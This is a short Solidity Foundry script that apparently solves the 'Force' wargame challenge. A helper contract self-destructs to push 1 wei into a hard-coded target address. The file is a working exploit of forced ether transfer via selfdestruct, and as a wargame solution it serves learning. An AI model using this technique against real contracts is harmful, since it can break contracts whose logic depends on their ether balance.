// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    constructor(address payable force_) payable {
        selfdestruct(force_);
    }
}

contract ForceSol is Script {

    function run() external {
        vm.startBroadcast();

        new Ex{value: 1 wei}(payable(0xD600F50aC376705CaC903602E3090916457cb19e));

        vm.stopBroadcast();
    }
}